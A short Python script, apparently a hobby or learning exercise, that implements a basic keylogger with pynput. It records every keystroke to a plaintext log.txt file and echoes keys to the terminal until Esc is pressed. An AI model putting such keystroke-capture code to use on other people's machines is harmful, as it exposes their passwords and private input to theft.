from pynput import keyboard
breakcount = 1
spacekey = ' '
enterkey = ' <enter> '
backspacekey = ' <backspace> '
tabkey = '\n<Tab> '

def keypress(key):  #Terminal and log.txt
    global spacekey
    global enterkey
    global backspacekey
    oparc = open('log.txt','a')
    #Keypress login in terminal
    try:
        print("'{0}'".format(key.char), end = '')
        oparc.writelines(str(key).replace("'",''))
    except AttributeError:
        print("'{0}'".format(key), end = '\n')
        if key == keyboard.Key.space:
            oparc.writelines(spacekey)
        elif key == keyboard.Key.enter:
            oparc.writelines(enterkey)
        elif key == keyboard.Key.backspace:
            oparc.writelines(backspacekey)
        elif key == keyboard.Key.tab:
            oparc.writelines(tabkey)
    #Finish logger
    if key == keyboard.Key.esc:
        print('end')
        oparc.close()
        return False

def special(key):   #Terminal
    global keycount
    #Backspace Release (release login)
    if key == keyboard.Key.backspace:
        print('{0} released'.format(key))

listener = keyboard.Listener(on_press = keypress, on_release = special)
listener.start()

print('Succesful.')
while True:
    input() #Keeps windows terminal open
